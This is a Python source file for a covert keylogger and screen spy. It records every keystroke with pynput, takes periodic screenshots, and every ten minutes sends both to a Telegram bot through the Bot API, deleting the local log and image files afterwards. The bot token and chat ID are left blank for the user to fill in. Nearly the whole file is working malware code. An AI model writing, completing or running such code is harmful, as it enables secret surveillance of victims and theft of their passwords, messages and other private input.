import time
import threading
import os
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
import requests

# ====== TELEGRAM SETUP ======
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# ====== VARIABLES ======
LOG_FILE = "keylog.txt"
key_buffer = []

# ====== MAPPING KEYS ======
key_map = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.caps_lock: "[CAPSLOCK]"
}

# ====== KEYLOGGING FUNCTION ======
def write_local_log(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(data)
    except Exception as e:
        print(f"[!] Log write error: {e}")

def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        
        if key == keyboard.Key.backspace:
            if key_buffer:
                key_buffer.pop()
            readable = ""
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.tab,
                     keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.alt]:
            key_buffer.append(" ")
            readable = " "
        elif key == keyboard.Key.space:
            readable = " "
        elif key == keyboard.Key.enter:
            readable = "\n"
        elif "Key." in key_str:
            readable = f"[{key_str.split('.')[-1].upper()}]"
        else:
            readable = key_str
        
        if readable:
            key_buffer.append(readable)
            # write_local_log(readable) // Uncomment this  to also log locally in local file.
        print(f"{key_buffer}", end="", flush=True)
    except Exception as e:
        print(f"[!] Key read error: {e}")

# ====== SEND KEYSTROKES TO TELEGRAM ======
def send_keystrokes_telegram():
    if not key_buffer:
        return
    try:
        data = ''.join(key_buffer)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"🧾 *Keystrokes Log* - `{timestamp}`\n```\n{data}\n```"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        res = requests.post(url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        })
        if res.status_code == 200:
            print("\n[✓] Keystrokes sent to Telegram.")
            key_buffer.clear()
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
        else:
            print(f"[!] Telegram message failed: {res.status_code}, {res.text}")
    except Exception as e:
        print(f"[!] Telegram keystroke error: {e}")

# ====== SEND SCREENSHOT TO TELEGRAM ======
def send_screenshot_telegram(file_path):
    try:
        with open(file_path, 'rb') as img:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            res = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"photo": img})
            if res.status_code == 200:
                print("[✓] Screenshot sent to Telegram.")
                os.remove(file_path)
            else:
                print(f"[!] Telegram screenshot failed: {res.status_code}, {res.text}")
    except Exception as e:
        print(f"[!] Screenshot upload error: {e}")

# ====== CAPTURE AND SEND SCREENSHOT ======
def capture_and_send_screenshot():
    try:
        filename = "screenshot.jpg"
        img = ImageGrab.grab()
        img = img.resize((960, 540))
        img.save(filename, "JPEG", quality=50)
        send_screenshot_telegram(filename)
    except Exception as e:
        print(f"[!] Screenshot capture error: {e}")

# ====== PERIODIC TASKS ======
def periodic_tasks():
    while True:
        time.sleep(600)  # 10 minutes
        send_keystrokes_telegram()
        capture_and_send_screenshot()

# ====== START BACKGROUND THREAD ======
threading.Thread(target=periodic_tasks, daemon=True).start()

# ====== START KEYLOGGER ======
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[!] Exiting...")
